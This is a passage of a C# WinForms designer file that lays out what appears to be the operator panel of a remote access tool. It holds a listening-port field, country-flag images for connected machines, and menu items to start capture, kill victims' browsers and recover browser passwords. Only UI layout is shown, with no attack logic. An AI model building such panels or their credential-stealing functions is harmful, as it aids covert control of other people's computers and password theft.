            this.Guna2PictureBox63 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2TextBox9 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2HtmlLabel54 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel120 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox60 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel121 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel76 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2TextBox10 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2HtmlLabel122 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox59 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2TextBox11 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2HtmlLabel113 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox48 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2PictureBox58 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel123 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel51 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox57 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2PictureBox66 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2PictureBox56 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2TextBox6 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2PictureBox55 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel104 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox54 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2TextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2PictureBox53 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2TextBox5 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2PictureBox52 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel112 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox50 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2CheckBox1 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox3 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox11 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox4 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox10 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox5 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox9 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox6 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox8 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox7 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.guna2Transition2 = new Guna.UI2.WinForms.Guna2Transition();
            this.Guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
            this.contextMenuStrip1.SuspendLayout();
            this.Menu_Painel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2CirclePictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox1)).BeginInit();
            this.StatusPanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ListenPort)).BeginInit();
            this.panel2.SuspendLayout();
            this.Painel_Menu.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox27)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox21)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox1)).BeginInit();
            this.Painel_connection.SuspendLayout();
            this.Painel_Home.SuspendLayout();
            this.Panel_ControlPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox31)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox30)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox26)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox25)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox24)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox23)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox22)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox19)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox20)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox17)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox16)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox15)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox14)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox80)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox18)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Chrome)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Edge)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Firefox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Brave)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Opera)).BeginInit();
            this.Painel_Right.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox40)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox70)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox29)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox8)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox10)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox11)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox12)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox13)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox35)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox41)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox36)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox42)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Moldura)).BeginInit();
            this.Painel_Ports.SuspendLayout();
            this.Guna2GradientPanel12.SuspendLayout();
            this.Guna2GradientPanel13.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox62)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox63)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox60)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox59)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox48)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox58)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox57)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox66)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox56)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox55)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox54)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox53)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox52)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox50)).BeginInit();
            this.SuspendLayout();
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Black;
            this.imageList1.Images.SetKeyName(0, "ad.png");
            this.imageList1.Images.SetKeyName(1, "ae.png");
            this.imageList1.Images.SetKeyName(2, "af.png");
            this.imageList1.Images.SetKeyName(3, "ag.png");
            this.imageList1.Images.SetKeyName(4, "ai.png");
            this.imageList1.Images.SetKeyName(5, "al.png");
            this.imageList1.Images.SetKeyName(6, "am.png");
            this.imageList1.Images.SetKeyName(7, "an.png");
            this.imageList1.Images.SetKeyName(8, "ao.png");
            this.imageList1.Images.SetKeyName(9, "ar.png");
            this.imageList1.Images.SetKeyName(10, "as.png");
            this.imageList1.Images.SetKeyName(11, "at.png");
            this.imageList1.Images.SetKeyName(12, "au.png");
            this.imageList1.Images.SetKeyName(13, "aw.png");
            this.imageList1.Images.SetKeyName(14, "ax.png");
            this.imageList1.Images.SetKeyName(15, "az.png");
            this.imageList1.Images.SetKeyName(16, "ba.png");
            this.imageList1.Images.SetKeyName(17, "bb.png");
            this.imageList1.Images.SetKeyName(18, "bd.png");
            this.imageList1.Images.SetKeyName(19, "be.png");
            this.imageList1.Images.SetKeyName(20, "bf.png");
            this.imageList1.Images.SetKeyName(21, "bg.png");
            this.imageList1.Images.SetKeyName(22, "bh.png");
            this.imageList1.Images.SetKeyName(23, "bi.png");
            this.imageList1.Images.SetKeyName(24, "bj.png");
            this.imageList1.Images.SetKeyName(25, "bm.png");
            this.imageList1.Images.SetKeyName(26, "bn.png");
            this.imageList1.Images.SetKeyName(27, "bo.png");
            this.imageList1.Images.SetKeyName(28, "br.png");
            this.imageList1.Images.SetKeyName(29, "bs.png");
            this.imageList1.Images.SetKeyName(30, "bt.png");
            this.imageList1.Images.SetKeyName(31, "bv.png");
            this.imageList1.Images.SetKeyName(32, "bw.png");
            this.imageList1.Images.SetKeyName(33, "by.png");
            this.imageList1.Images.SetKeyName(34, "bz.png");
            this.imageList1.Images.SetKeyName(35, "ca.png");
            this.imageList1.Images.SetKeyName(36, "catalonia.png");
            this.imageList1.Images.SetKeyName(37, "cc.png");
            this.imageList1.Images.SetKeyName(38, "cd.png");
            this.imageList1.Images.SetKeyName(39, "cf.png");
            this.imageList1.Images.SetKeyName(40, "cg.png");
            this.imageList1.Images.SetKeyName(41, "ch.png");
            this.imageList1.Images.SetKeyName(42, "ci.png");
            this.imageList1.Images.SetKeyName(43, "ck.png");
            this.imageList1.Images.SetKeyName(44, "cl.png");
            this.imageList1.Images.SetKeyName(45, "cm.png");
            this.imageList1.Images.SetKeyName(46, "cn.png");
            this.imageList1.Images.SetKeyName(47, "co.png");
            this.imageList1.Images.SetKeyName(48, "cr.png");
            this.imageList1.Images.SetKeyName(49, "cs.png");
            this.imageList1.Images.SetKeyName(50, "cu.png");
            this.imageList1.Images.SetKeyName(51, "cv.png");
            this.imageList1.Images.SetKeyName(52, "cx.png");
            this.imageList1.Images.SetKeyName(53, "cy.png");
            this.imageList1.Images.SetKeyName(54, "cz.png");
            this.imageList1.Images.SetKeyName(55, "de.png");
            this.imageList1.Images.SetKeyName(56, "dj.png");
            this.imageList1.Images.SetKeyName(57, "dk.png");
            this.imageList1.Images.SetKeyName(58, "dm.png");
            this.imageList1.Images.SetKeyName(59, "do.png");
            this.imageList1.Images.SetKeyName(60, "dz.png");
            this.imageList1.Images.SetKeyName(61, "ec.png");
            this.imageList1.Images.SetKeyName(62, "ee.png");
            this.imageList1.Images.SetKeyName(63, "eg.png");
            this.imageList1.Images.SetKeyName(64, "eh.png");
            this.imageList1.Images.SetKeyName(65, "england.png");
            this.imageList1.Images.SetKeyName(66, "er.png");
            this.imageList1.Images.SetKeyName(67, "es.png");
            this.imageList1.Images.SetKeyName(68, "et.png");
            this.imageList1.Images.SetKeyName(69, "europeanunion.png");
            this.imageList1.Images.SetKeyName(70, "fam.png");
            this.imageList1.Images.SetKeyName(71, "fi.png");
            this.imageList1.Images.SetKeyName(72, "fj.png");
            this.imageList1.Images.SetKeyName(73, "fk.png");
            this.imageList1.Images.SetKeyName(74, "fm.png");
            this.imageList1.Images.SetKeyName(75, "fo.png");
            this.imageList1.Images.SetKeyName(76, "fr.png");
            this.imageList1.Images.SetKeyName(77, "ga.png");
            this.imageList1.Images.SetKeyName(78, "gb.png");
            this.imageList1.Images.SetKeyName(79, "gd.png");
            this.imageList1.Images.SetKeyName(80, "ge.png");
            this.imageList1.Images.SetKeyName(81, "gf.png");
            this.imageList1.Images.SetKeyName(82, "gh.png");
            this.imageList1.Images.SetKeyName(83, "gi.png");
            this.imageList1.Images.SetKeyName(84, "gl.png");
            this.imageList1.Images.SetKeyName(85, "gm.png");
            this.imageList1.Images.SetKeyName(86, "gn.png");
            this.imageList1.Images.SetKeyName(87, "gp.png");
            this.imageList1.Images.SetKeyName(88, "gq.png");
            this.imageList1.Images.SetKeyName(89, "gr.png");
            this.imageList1.Images.SetKeyName(90, "gs.png");
            this.imageList1.Images.SetKeyName(91, "gt.png");
            this.imageList1.Images.SetKeyName(92, "gu.png");
            this.imageList1.Images.SetKeyName(93, "gw.png");
            this.imageList1.Images.SetKeyName(94, "gy.png");
            this.imageList1.Images.SetKeyName(95, "hk.png");
            this.imageList1.Images.SetKeyName(96, "hm.png");
            this.imageList1.Images.SetKeyName(97, "hn.png");
            this.imageList1.Images.SetKeyName(98, "hr.png");
            this.imageList1.Images.SetKeyName(99, "ht.png");
            this.imageList1.Images.SetKeyName(100, "hu.png");
            this.imageList1.Images.SetKeyName(101, "id.png");
            this.imageList1.Images.SetKeyName(102, "ie.png");
            this.imageList1.Images.SetKeyName(103, "il.png");
            this.imageList1.Images.SetKeyName(104, "in.png");
            this.imageList1.Images.SetKeyName(105, "io.png");
            this.imageList1.Images.SetKeyName(106, "iq.png");
            this.imageList1.Images.SetKeyName(107, "ir.png");
            this.imageList1.Images.SetKeyName(108, "is.png");
            this.imageList1.Images.SetKeyName(109, "it.png");
            this.imageList1.Images.SetKeyName(110, "jm.png");
            this.imageList1.Images.SetKeyName(111, "jo.png");
            this.imageList1.Images.SetKeyName(112, "jp.png");
            this.imageList1.Images.SetKeyName(113, "ke.png");
            this.imageList1.Images.SetKeyName(114, "kg.png");
            this.imageList1.Images.SetKeyName(115, "kh.png");
            this.imageList1.Images.SetKeyName(116, "ki.png");
            this.imageList1.Images.SetKeyName(117, "km.png");
            this.imageList1.Images.SetKeyName(118, "kn.png");
            this.imageList1.Images.SetKeyName(119, "kp.png");
            this.imageList1.Images.SetKeyName(120, "kr.png");
            this.imageList1.Images.SetKeyName(121, "kw.png");
            this.imageList1.Images.SetKeyName(122, "ky.png");
            this.imageList1.Images.SetKeyName(123, "kz.png");
            this.imageList1.Images.SetKeyName(124, "la.png");
            this.imageList1.Images.SetKeyName(125, "lb.png");
            this.imageList1.Images.SetKeyName(126, "lc.png");
            this.imageList1.Images.SetKeyName(127, "li.png");
            this.imageList1.Images.SetKeyName(128, "lk.png");
            this.imageList1.Images.SetKeyName(129, "lr.png");
            this.imageList1.Images.SetKeyName(130, "ls.png");
            this.imageList1.Images.SetKeyName(131, "lt.png");
            this.imageList1.Images.SetKeyName(132, "lu.png");
            this.imageList1.Images.SetKeyName(133, "lv.png");
            this.imageList1.Images.SetKeyName(134, "ly.png");
            this.imageList1.Images.SetKeyName(135, "ma.png");
            this.imageList1.Images.SetKeyName(136, "mc.png");
            this.imageList1.Images.SetKeyName(137, "md.png");
            this.imageList1.Images.SetKeyName(138, "me.png");
            this.imageList1.Images.SetKeyName(139, "mg.png");
            this.imageList1.Images.SetKeyName(140, "mh.png");
            this.imageList1.Images.SetKeyName(141, "mk.png");
            this.imageList1.Images.SetKeyName(142, "ml.png");
            this.imageList1.Images.SetKeyName(143, "mm.png");
            this.imageList1.Images.SetKeyName(144, "mn.png");
            this.imageList1.Images.SetKeyName(145, "mo.png");
            this.imageList1.Images.SetKeyName(146, "mp.png");
            this.imageList1.Images.SetKeyName(147, "mq.png");
            this.imageList1.Images.SetKeyName(148, "mr.png");
            this.imageList1.Images.SetKeyName(149, "ms.png");
            this.imageList1.Images.SetKeyName(150, "mt.png");
            this.imageList1.Images.SetKeyName(151, "mu.png");
            this.imageList1.Images.SetKeyName(152, "mv.png");
            this.imageList1.Images.SetKeyName(153, "mw.png");
            this.imageList1.Images.SetKeyName(154, "mx.png");
            this.imageList1.Images.SetKeyName(155, "my.png");
            this.imageList1.Images.SetKeyName(156, "mz.png");
            this.imageList1.Images.SetKeyName(157, "na.png");
            this.imageList1.Images.SetKeyName(158, "nc.png");
            this.imageList1.Images.SetKeyName(159, "ne.png");
            this.imageList1.Images.SetKeyName(160, "nf.png");
            this.imageList1.Images.SetKeyName(161, "ng.png");
            this.imageList1.Images.SetKeyName(162, "ni.png");
            this.imageList1.Images.SetKeyName(163, "nl.png");
            this.imageList1.Images.SetKeyName(164, "no.png");
            this.imageList1.Images.SetKeyName(165, "np.png");
            this.imageList1.Images.SetKeyName(166, "nr.png");
            this.imageList1.Images.SetKeyName(167, "nu.png");
            this.imageList1.Images.SetKeyName(168, "nz.png");
            this.imageList1.Images.SetKeyName(169, "om.png");
            this.imageList1.Images.SetKeyName(170, "pa.png");
            this.imageList1.Images.SetKeyName(171, "pe.png");
            this.imageList1.Images.SetKeyName(172, "pf.png");
            this.imageList1.Images.SetKeyName(173, "pg.png");
            this.imageList1.Images.SetKeyName(174, "ph.png");
            this.imageList1.Images.SetKeyName(175, "pk.png");
            this.imageList1.Images.SetKeyName(176, "pl.png");
            this.imageList1.Images.SetKeyName(177, "pm.png");
            this.imageList1.Images.SetKeyName(178, "pn.png");
            this.imageList1.Images.SetKeyName(179, "pr.png");
            this.imageList1.Images.SetKeyName(180, "ps.png");
            this.imageList1.Images.SetKeyName(181, "pt.png");
            this.imageList1.Images.SetKeyName(182, "pw.png");
            this.imageList1.Images.SetKeyName(183, "py.png");
            this.imageList1.Images.SetKeyName(184, "qa.png");
            this.imageList1.Images.SetKeyName(185, "re.png");
            this.imageList1.Images.SetKeyName(186, "ro.png");
            this.imageList1.Images.SetKeyName(187, "rs.png");
            this.imageList1.Images.SetKeyName(188, "ru.png");
            this.imageList1.Images.SetKeyName(189, "rw.png");
            this.imageList1.Images.SetKeyName(190, "sa.png");
            this.imageList1.Images.SetKeyName(191, "sb.png");
            this.imageList1.Images.SetKeyName(192, "sc.png");
            this.imageList1.Images.SetKeyName(193, "scotland.png");
            this.imageList1.Images.SetKeyName(194, "sd.png");
            this.imageList1.Images.SetKeyName(195, "se.png");
            this.imageList1.Images.SetKeyName(196, "sg.png");
            this.imageList1.Images.SetKeyName(197, "sh.png");
            this.imageList1.Images.SetKeyName(198, "si.png");
            this.imageList1.Images.SetKeyName(199, "sj.png");
            this.imageList1.Images.SetKeyName(200, "sk.png");
            this.imageList1.Images.SetKeyName(201, "sl.png");
            this.imageList1.Images.SetKeyName(202, "sm.png");
            this.imageList1.Images.SetKeyName(203, "sn.png");
            this.imageList1.Images.SetKeyName(204, "so.png");
            this.imageList1.Images.SetKeyName(205, "sr.png");
            this.imageList1.Images.SetKeyName(206, "st.png");
            this.imageList1.Images.SetKeyName(207, "sv.png");
            this.imageList1.Images.SetKeyName(208, "sy.png");
            this.imageList1.Images.SetKeyName(209, "sz.png");
            this.imageList1.Images.SetKeyName(210, "tc.png");
            this.imageList1.Images.SetKeyName(211, "td.png");
            this.imageList1.Images.SetKeyName(212, "tf.png");
            this.imageList1.Images.SetKeyName(213, "tg.png");
            this.imageList1.Images.SetKeyName(214, "th.png");
            this.imageList1.Images.SetKeyName(215, "tj.png");
            this.imageList1.Images.SetKeyName(216, "tk.png");
            this.imageList1.Images.SetKeyName(217, "tl.png");
            this.imageList1.Images.SetKeyName(218, "tm.png");
            this.imageList1.Images.SetKeyName(219, "tn.png");
            this.imageList1.Images.SetKeyName(220, "to.png");
            this.imageList1.Images.SetKeyName(221, "tr.png");
            this.imageList1.Images.SetKeyName(222, "tt.png");
            this.imageList1.Images.SetKeyName(223, "tv.png");
            this.imageList1.Images.SetKeyName(224, "tw.png");
            this.imageList1.Images.SetKeyName(225, "tz.png");
            this.imageList1.Images.SetKeyName(226, "ua.png");
            this.imageList1.Images.SetKeyName(227, "ug.png");
            this.imageList1.Images.SetKeyName(228, "um.png");
            this.imageList1.Images.SetKeyName(229, "us.png");
            this.imageList1.Images.SetKeyName(230, "uy.png");
            this.imageList1.Images.SetKeyName(231, "uz.png");
            this.imageList1.Images.SetKeyName(232, "va.png");
            this.imageList1.Images.SetKeyName(233, "vc.png");
            this.imageList1.Images.SetKeyName(234, "ve.png");
            this.imageList1.Images.SetKeyName(235, "vg.png");
            this.imageList1.Images.SetKeyName(236, "vi.png");
            this.imageList1.Images.SetKeyName(237, "vn.png");
            this.imageList1.Images.SetKeyName(238, "vu.png");
            this.imageList1.Images.SetKeyName(239, "wales.png");
            this.imageList1.Images.SetKeyName(240, "wf.png");
            this.imageList1.Images.SetKeyName(241, "ws.png");
            this.imageList1.Images.SetKeyName(242, "ye.png");
            this.imageList1.Images.SetKeyName(243, "yt.png");
            this.imageList1.Images.SetKeyName(244, "za.png");
            this.imageList1.Images.SetKeyName(245, "zm.png");
            this.imageList1.Images.SetKeyName(246, "zw.png");
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2Transition1.SetDecoration(this.contextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.contextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.contextMenuStrip1.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(25, 25);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem3,
            this.toolStripMenuItem10,
            this.toolStripMenuItem1,
            this.toolStripMenuItem2,
            this.toolStripMenuItem7,
            this.toolStripMenuItem6,
            this.toolStripMenuItem9,
            this.toolStripMenuItem8,
            this.toolStripMenuItem4,
            this.toolStripMenuItem5,
            this.BrowserRecovery,
            this.killBrowsersToolStripMenuItem1});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.contextMenuStrip1.Size = new System.Drawing.Size(209, 388);
            // 
            // toolStripMenuItem3
            // 
            this.toolStripMenuItem3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem3.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem3.Image")));
            this.toolStripMenuItem3.Name = "toolStripMenuItem3";
            this.toolStripMenuItem3.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem3.Text = "Start Capture";
            this.toolStripMenuItem3.Click += new System.EventHandler(this.toolStripMenuItem3_Click);
            // 
            // toolStripMenuItem10
            // 
            this.toolStripMenuItem10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem10.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem10.Image")));
            this.toolStripMenuItem10.Name = "toolStripMenuItem10";
            this.toolStripMenuItem10.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem10.Text = "Reset Desktop";
            this.toolStripMenuItem10.Click += new System.EventHandler(this.toolStripMenuItem10_Click);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem1.Image")));
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem1.Text = "Kill Chrome Browser";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem2.Image")));
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem2.Text = "Kill Brave Browser";
            this.toolStripMenuItem2.Click += new System.EventHandler(this.toolStripMenuItem2_Click);
            // 
            // toolStripMenuItem7
            // 
            this.toolStripMenuItem7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem7.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem7.Image")));
            this.toolStripMenuItem7.Name = "toolStripMenuItem7";
            this.toolStripMenuItem7.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem7.Text = "Kill Edge Browser";
            this.toolStripMenuItem7.Click += new System.EventHandler(this.toolStripMenuItem7_Click);
            // 
            // toolStripMenuItem6
            // 
            this.toolStripMenuItem6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem6.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem6.Image")));
            this.toolStripMenuItem6.Name = "toolStripMenuItem6";
            this.toolStripMenuItem6.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem6.Text = "Kill Firefox Browser";
            this.toolStripMenuItem6.Click += new System.EventHandler(this.toolStripMenuItem6_Click);
            // 
            // toolStripMenuItem9
            // 
            this.toolStripMenuItem9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem9.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem9.Image")));
            this.toolStripMenuItem9.Name = "toolStripMenuItem9";
            this.toolStripMenuItem9.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem9.Text = "Kill Opera Browser";
            // 
            // toolStripMenuItem8
            // 
            this.toolStripMenuItem8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem8.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem8.Image")));
            this.toolStripMenuItem8.Name = "toolStripMenuItem8";
            this.toolStripMenuItem8.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem8.Text = "Kill Vivaldi Browser";
            this.toolStripMenuItem8.Click += new System.EventHandler(this.toolStripMenuItem8_Click);
            // 
            // toolStripMenuItem4
            // 
            this.toolStripMenuItem4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem4.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem4.Image")));
            this.toolStripMenuItem4.Name = "toolStripMenuItem4";
            this.toolStripMenuItem4.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem4.Text = "Kill Maxthon Browser";
            this.toolStripMenuItem4.Click += new System.EventHandler(this.toolStripMenuItem4_Click);
            // 
            // toolStripMenuItem5
            // 
            this.toolStripMenuItem5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.toolStripMenuItem5.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem5.Image")));
            this.toolStripMenuItem5.Name = "toolStripMenuItem5";
            this.toolStripMenuItem5.Size = new System.Drawing.Size(208, 32);
            this.toolStripMenuItem5.Text = "Kill Comodo Browser";
            this.toolStripMenuItem5.Click += new System.EventHandler(this.toolStripMenuItem5_Click);
            // 
            // BrowserRecovery
            // 
            this.BrowserRecovery.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.BrowserRecovery.Image = ((System.Drawing.Image)(resources.GetObject("BrowserRecovery.Image")));
            this.BrowserRecovery.Name = "BrowserRecovery";
            this.BrowserRecovery.Size = new System.Drawing.Size(208, 32);
            this.BrowserRecovery.Text = "Password Recovery";
